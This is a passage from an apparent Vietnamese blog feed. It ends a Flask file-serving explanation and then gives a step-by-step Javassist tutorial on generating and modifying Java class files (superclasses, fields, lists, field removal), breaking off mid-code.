os.path.isfile(path):</span><br><span class="line">                <span class="keyword">return</span> send_file(path)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> response(<span class="string">&quot;Not Found.&quot;</span>, <span class="number">404</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> response(<span class="string">&quot;Failed.&quot;</span>, <span class="number">500</span>)</span><br></pre></td></tr></table></figure><p>Đầu tiên, khi mọi request đến trang web app này, nó sẽ lấy phần path làm tham số truyền vào biến file ở route này.</p><p>Biến path sẽ được nối như sau:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">basedir = <span class="string">&quot;/var/www/uploads&quot;</span></span><br><span class="line">file = <span class="string">&quot;image.jpg&quot;</span></span><br><span class="line">path = os.path.join(basedir, file)</span><br><span class="line"><span class="built_in">print</span>(path)</span><br><span class="line"><span class="comment"># Output: &quot;/var/www/uploads/image.jpg&quot;</span></span><br></pre></td></tr></table></figure><p>Sau đó nó sẽ check nếu file tồn tại thì thực hiện send_file</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Co-ban-ve-Flask-web&quot;&gt;&lt;a href=&quot;#Co-ban-ve-Flask-web&quot; class=&quot;headerlink&quot; title=&quot;Cơ bản về Flask web&quot;&gt;&lt;/a&gt;Cơ bản về Flask web&lt;/h1&gt;&lt;h2 i</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Javassist trong Java.</title>
    <link href="https://rayinaw.github.io/2022/12/24/a/"/>
    <id>https://rayinaw.github.io/2022/12/24/a/</id>
    <published>2022-12-23T22:02:40.000Z</published>
    <updated>2022-12-30T16:17:35.224Z</updated>
    
    <content type="html"><![CDATA[<p>Để chạy một chương trình Java chúng ta cần trải qua hai bước:</p><ul><li>Bước một: compile file text format(.java) sang file Java bytecode(.class) bằng câu lệnh <code>javac myHelloWorld.java</code></li><li>Bước hai: chạy file .class thông qua JVM để máy ảo JVM chuyển file .class thành bytecode mà OS có thể hiểu được bằng câu lệnh <code>java myHelloWorld.class</code></li></ul><p>Javassist là một thư viện dùng để xử lý Java bytecode trong file <code>.class</code>. Chúng ta cùng đi sâu vào cách sử dụng nhé~</p><h2 id="Mot-so-lop-va-phuong-thuc-co-ban"><a href="#Mot-so-lop-va-phuong-thuc-co-ban" class="headerlink" title="Một số lớp và phương thức cơ bản"></a>Một số lớp và phương thức cơ bản</h2><h3 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h3><p>ClassPool là lớp gốc kiểm soát việc sửa đổi bytecode. Nó là nơi chứa các CtClass object (CtClass object đại diện cho một file class).</p><h4 id="1-ClassPool-get"><a href="#1-ClassPool-get" class="headerlink" title="1. ClassPool.get()"></a>1. ClassPool.get()</h4><p>Mã nguồn:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> CtClass[] get(String[] classnames) <span class="keyword">throws</span> NotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (classnames == <span class="literal">null</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">CtClass</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> classnames.length;</span><br><span class="line">        CtClass[] result = <span class="keyword">new</span> <span class="title class_">CtClass</span>[num];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; num; ++i)</span><br><span class="line">            result[i] = get(classnames[i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Phương thức này thực hiện đọc và dịch sang class file từ file gốc rồi trả về một CtClass đại diện cho một class file.<br>Tham số classnames là một system path đến lớp cần đọc.<br>####</p><h3 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h3><h4 id="CtClass-writeFile"><a href="#CtClass-writeFile" class="headerlink" title="CtClass.writeFile()"></a>CtClass.writeFile()</h4><p>Viết class file CtClass vào file trong hệ thống.</p><h4 id="ctClass-toBytecode"><a href="#ctClass-toBytecode" class="headerlink" title="ctClass.toBytecode()"></a>ctClass.toBytecode()</h4><p>Chuyển CtClass object thành bytecode.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;org.example.Employee&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] byteCode = ctClass.toBytecode();</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(byteCode);</span><br><span class="line">System.out.println(str);</span><br></pre></td></tr></table></figure><h2 id="Thao-tac-voi-javassist"><a href="#Thao-tac-voi-javassist" class="headerlink" title="Thao tác với javassist"></a>Thao tác với javassist</h2><h3 id="Tao-mot-class-file-cua-mot-file"><a href="#Tao-mot-class-file-cua-mot-file" class="headerlink" title="Tạo một .class file của một file"></a>Tạo một .class file của một file</h3><p>Giả sử chúng ta có lớp Animal.java sau:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Animal</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> vegetarian;</span><br><span class="line">    <span class="keyword">private</span> String eats;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> noOfLegs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">()</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Animal</span><span class="params">(<span class="type">boolean</span> veg, String food)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.vegetarian = veg;</span><br><span class="line">        <span class="built_in">this</span>.eats = food;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isVegetarian</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> vegetarian;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setVegetarian</span><span class="params">(<span class="type">boolean</span> vegetarian)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.vegetarian = vegetarian;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getEats</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> eats;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setEats</span><span class="params">(String eats)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.eats = eats;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Để tạo file bytecode của lớp này chúng ta sẽ thực hiện những bước như sau:</p><ul><li>Bước 1: Lấy một instance của lớp ClassPool<br><code>ClassPool pool = ClassPool.getDefault();</code></li><li>Bước 2: Đọc class file từ tệp nguồn<br><code>CtClass cc = pool.get(&quot;org.example.Animal&quot;);</code></li><li>Bước 3: Viết class file CtClass vào directory<br><code>cc.writeFile(&quot;/Users/rayin_awarf/Desktop/work&quot;);</code></li></ul><p>File name <code>main.java</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;org.example.Employee&quot;</span>);</span><br><span class="line">        cc.writeFile(<span class="string">&quot;/Users/rayin_awarf/Desktop/work&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Chạy file main.java chúng ta thấy file Employee.class xuất hiện ở thư mục chỉ định.</p><h3 id="Them-lop-cha-vao-class"><a href="#Them-lop-cha-vao-class" class="headerlink" title="Thêm lớp cha vào class"></a>Thêm lớp cha vào class</h3><p>Bước 1: Lấy một instance của ClassPool<br><code>ClassPool pool = ClassPool.getDefault();</code><br>Bước 2: Đọc file rồi dịch sang bytecode lưu vào object CtClass<br><code>CtClass cc = pool.get(&quot;org.example.Employee&quot;);</code><br>Bước 3: Set super class<br><code>cc.setSuperclass(pool.get(&quot;org.example.BaseEntity&quot;));</code><br>Bước 4:<br><code>cc.writeFile(&quot;/Users/rayin_awarf/Desktop&quot;);</code><br>Lớp Employee.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sample.app.model;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Employee</span> &#123;</span><br><span class="line"> <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line"> <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> id;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setId</span><span class="params">(<span class="type">int</span> id)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.id = id;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> name;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">  <span class="built_in">this</span>.name = name;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Lớp BaseEntity.java dùng để làm lớp cha.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BaseEntity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String createdBy;</span><br><span class="line">    <span class="keyword">private</span> String updatedBy;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCreatedBy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> createdBy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCreatedBy</span><span class="params">(String createdBy)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.createdBy = createdBy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getUpdatedBy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> updatedBy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUpdatedBy</span><span class="params">(String updatedBy)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.updatedBy = updatedBy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>File name: Main.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.get(<span class="string">&quot;org.example.Employee&quot;</span>);</span><br><span class="line">        cc.setSuperclass(pool.get(<span class="string">&quot;org.example.BaseEntity&quot;</span>));</span><br><span class="line"></span><br><span class="line">        cc.writeFile(<span class="string">&quot;/Users/rayin_awarf/Desktop/&quot;</span>);</span><br><span class="line">  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Chạy Main.java, một tệp mới được tạo ở thư mục được chỉ định. Mở file Employee.class bằng decompiler chúng ta thấy lớp Employee đã kế thừa lớp BaseEntity thành công.</p><h3 id="Tao-class-moi"><a href="#Tao-class-moi" class="headerlink" title="Tạo class mới"></a>Tạo class mới</h3><p>Bước 1: Lấy một instance của lớp ClassPool<br><code>ClassPool pool = ClassPool.getDefault();</code><br>Bước 2: Sử dụng <code>makeClass</code> method để define class.<br><code>CtClass ctClass = pool.makeClass(&quot;Point&quot;);</code><br>Chạy file dưới đây, một file mới được tạo ở Desktop:<br>Bước 3: Ghi file xuống thư mục bằng <code>writeFile</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">  <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">  <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">  <span class="comment">//Sử dụng class vừa tạo</span></span><br><span class="line">  <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ctClass.toClass().newInstance();</span><br><span class="line">  System.out.println(<span class="string">&quot;Class Name : &quot;</span> + obj.getClass());</span><br><span class="line">  </span><br><span class="line">  ctClass.writeFile(<span class="string">&quot;/Users/rayin_awarf/Desktop&quot;</span>);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Them-fields-vao-class"><a href="#Them-fields-vao-class" class="headerlink" title="Thêm fields vào class"></a>Thêm fields vào class</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> javassist.Modifier;</span><br><span class="line"><span class="comment">//Hoặc import java.lang.reflect.Modifier;</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        <span class="type">CtField</span> <span class="variable">testField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;TestField&quot;</span>, ctClass);</span><br><span class="line">        testField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        ctClass.addField(testField);</span><br><span class="line">        <span class="comment">//Chúng ta có thể set dữ liệu cho field bằng cách thêm tham số cho phương thức addField.</span></span><br><span class="line">        <span class="comment">//ctClass.addField(testField, &quot;999&quot;);</span></span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;/Users/rayin_awarf/Desktop&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Chạy file và mở file class, TestField đã được thêm vào class.<br>Chúng ta có thể thêm nhiều Modifier bằng cách: <code>testField.setModifiers(Modifier.STATIC | Modifier.FINAL | Modifier.PUBLIC);</code></p><h3 id="Them-non-primitive-fields-vao-class"><a href="#Them-non-primitive-fields-vao-class" class="headerlink" title="Thêm non-primitive fields vào class"></a>Thêm non-primitive fields vào class</h3><p>Thêm fields Point vào class.<br>Filename: Point.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Point</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> x;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> y;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getX</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setX</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.x = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getY</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setY</span><span class="params">(<span class="type">int</span> y)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.y = y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Filename: App.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.get(<span class="string">&quot;org.example.Point&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">testClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(ctClass, <span class="string">&quot;abc&quot;</span>, testClass);</span><br><span class="line">        ctField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        testClass.addField(ctField);</span><br><span class="line">        testClass.writeFile(<span class="string">&quot;/Users/rayin_awarf/Desktop&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Them-list-vao-class"><a href="#Them-list-vao-class" class="headerlink" title="Thêm list vào class"></a>Thêm list vào class</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">classPool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">demoClass</span> <span class="operator">=</span> classPool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">arrListClazz</span> <span class="operator">=</span> classPool.get(<span class="string">&quot;java.util.List&quot;</span>);</span><br><span class="line">        <span class="type">CtField</span> <span class="variable">ctField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(arrListClazz, <span class="string">&quot;myList&quot;</span>, demoClass);</span><br><span class="line">        ctField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        demoClass.addField(ctField);</span><br><span class="line"></span><br><span class="line">        demoClass.writeFile(<span class="string">&quot;/Users/rayin_awarf/Desktop&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Go-field-tu-class"><a href="#Go-field-tu-class" class="headerlink" title="Gỡ field từ class"></a>Gỡ field từ class</h3><p>Tạo field TestField trong Test.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> javassist.Modifier;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">App</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">        <span class="type">CtField</span> <span class="variable">testField</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(CtClass.intType, <span class="string">&quot;TestField&quot;</span>, ctClass);</span><br><span class="line">        testField.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        ctClass.addField(testField);</span><br><span class="line">        ctClass.writeFile(<span class="string">&quot;/Users/rayin_awarf/Desktop&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Để gỡ TestField trong Test.class chúng ta thực hiện như sau:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> 